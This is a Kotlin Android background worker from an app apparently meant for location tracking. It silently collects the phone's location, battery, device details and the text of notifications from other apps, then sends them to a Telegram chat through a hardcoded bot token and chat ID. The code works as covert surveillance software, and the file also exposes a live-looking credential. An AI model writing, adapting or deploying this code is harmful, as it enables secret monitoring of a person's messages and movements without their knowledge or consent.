// android/app/src/main/java/com/example/location_tracking_app/DataUploadWorker.kt
package com.example.location_tracking_app

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.BatteryManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.example.location_tracking_app.db.AppDatabase
import com.example.location_tracking_app.db.NotificationEntity
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class DataUploadWorker(private val context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    companion object {
        const val WORK_NAME = "DataUploadWorker"
    }

    private val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
    private val notificationDao = AppDatabase.getDatabase(context).notificationDao()

    override suspend fun doWork(): Result {
        Log.d(WORK_NAME, "Worker starting...")

        // 1. Check for location permission first. If not granted, fail immediately.
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e(WORK_NAME, "Location permission not granted. Stopping worker.")
            return Result.failure() // Failure means it won't be retried unless conditions change.
        }

        // Fetch all stored notifications from the database
        val notifications = notificationDao.getAll()
        Log.d(WORK_NAME, "Found ${notifications.size} notifications in the database.")

        // 2. Wrap all data fetching and sending in a try-catch block to handle errors.
        return try {
            // Fetch all necessary data
            val location = getCurrentLocation()
            val batteryLevel = getBatteryLevel()
            val deviceModel = Build.MODEL
            val deviceManufacturer = Build.MANUFACTURER
            val androidVersion = Build.VERSION.RELEASE
            val sdkVersion = Build.VERSION.SDK_INT

            // Get the saved device name from SharedPreferences
            val prefs = context.getSharedPreferences(MainActivity.PREFS_NAME, Context.MODE_PRIVATE)
            val deviceName = prefs.getString(MainActivity.KEY_DEVICE_NAME, "Unnamed Device") ?: "Unnamed Device"

            // 3. Send data to API and get a success/failure result.
            val isSuccess = sendDataToApi(
                deviceName,
                location,
                batteryLevel,
                "$deviceManufacturer $deviceModel",
                "Android $androidVersion (SDK $sdkVersion)",
                notifications
            )

            if (isSuccess) {
                // 4. If sending was successful, delete the sent notifications from the database.
                if (notifications.isNotEmpty()) {
                    val idsToDelete = notifications.map { it.id }
                    notificationDao.deleteByIds(idsToDelete)
                    Log.d(WORK_NAME, "Successfully sent and deleted ${idsToDelete.size} notifications.")
                }
                Log.d(WORK_NAME, "Worker finished successfully.")
                Result.success()
            } else {
                // 5. If sending failed, retry later. The notifications remain in the DB.
                Log.w(WORK_NAME, "API send failed. Retrying later.")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e(WORK_NAME, "Worker failed with an exception", e)
            Result.retry() // Something unexpected went wrong, retry later.
        }
    }

    private suspend fun getCurrentLocation(): Location? {
        return try {
            fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, CancellationTokenSource().token).await()
        } catch (e: SecurityException) {
            Log.e(WORK_NAME, "Location permission not granted for getting location", e)
            null
        } catch (e: Exception) {
            Log.e(WORK_NAME, "Failed to get location", e)
            null
        }
    }

    private fun getBatteryLevel(): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private suspend fun sendDataToApi(
        deviceName: String,
        location: Location?,
        batteryLevel: Int,
        deviceModel: String,
        androidVersion: String,
        notifications: List<NotificationEntity>
    ): Boolean {
        // Use withContext to ensure this network operation runs on the IO dispatcher.
        return withContext(Dispatchers.IO) {
            val botToken = "7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4" // Replace with your bot token
            val chatId = "5080555370" // Replace with your chat ID

            val latitude = location?.latitude ?: "N/A"
            val longitude = location?.longitude ?: "N/A"

            val notificationText = if (notifications.isNotEmpty()) {
                val formatter = SimpleDateFormat("HH:mm", Locale.getDefault())
                val builder = StringBuilder("\n\n🔔 *Recent Notifications*:\n")
                // Limit to 15 notifications to avoid creating a message that's too long for Telegram.
                notifications.take(15).forEach {
                    val time = formatter.format(Date(it.timestamp))
                    builder.append("`[$time] ${it.packageName}`\n")
                    builder.append("*${it.title.trim()}*\n")
                    builder.append("_${it.text.trim()}_\n\n")
                }
                builder.toString()
            } else {
                "" // No notifications, so append nothing.
            }

            // Construct the final message with Markdown formatting.
            val message = """
            📱 *${deviceName.ifBlank { "Device Update" }}*
            
            📍 *Location*:
            - Latitude: $latitude
            - Longitude: $longitude
            - [View on Google Maps](https://maps.google.com/?q=$latitude,$longitude)
            
            🔋 *Battery*: $batteryLevel%
            
            ⚙️ *Device Info*:
            - Model: $deviceModel
            - OS: $androidVersion
            $notificationText
            """.trimIndent()

            var urlConnection: HttpURLConnection? = null
            try {
                val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
                urlConnection = url.openConnection() as HttpURLConnection
                urlConnection.requestMethod = "POST"
                urlConnection.doOutput = true
                urlConnection.setRequestProperty("Content-Type", "application/json")

                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", message)
                    put("parse_mode", "Markdown")
                }.toString()

                val writer = OutputStreamWriter(urlConnection.outputStream)
                writer.write(payload)
                writer.flush()
                writer.close()

                val responseCode = urlConnection.responseCode
                Log.d(WORK_NAME, "Telegram API response code: $responseCode")
                // Consider any 2xx status code as a success.
                responseCode in 200..299
            } catch (e: Exception) {
                Log.e(WORK_NAME, "Failed to send data to Telegram", e)
                false // Return false on any network or IO failure.
            } finally {
                urlConnection?.disconnect()
            }
        }
    }
}
